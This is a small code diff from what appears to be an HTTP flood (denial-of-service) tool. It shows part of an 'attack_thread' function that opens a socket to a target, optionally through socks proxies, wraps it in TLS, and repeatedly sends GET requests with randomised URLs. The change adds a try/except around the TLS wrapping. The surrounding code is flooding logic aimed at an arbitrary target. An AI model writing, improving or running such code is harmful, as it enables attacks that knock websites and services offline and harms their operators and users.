@@ -211,7 +211,8 @@ def attack_thread(event: threading.Event, socks_type: int, target: str, port: in
             s.connect((target, port))
             test_allowed = True
             if protocol == 'https' and test_allowed:
-                s = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2).wrap_socket(s, server_hostname= target)
+                try: s = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2).wrap_socket(s, server_hostname= target)
+                except DeprecationWarning: pass
             try:
                 for _ in range(multiple + 1):
                     get_host = "GET " + path + add + make_random_url() + ' HTTP/1.1' + line_break + 'Host: ' + target + line_break
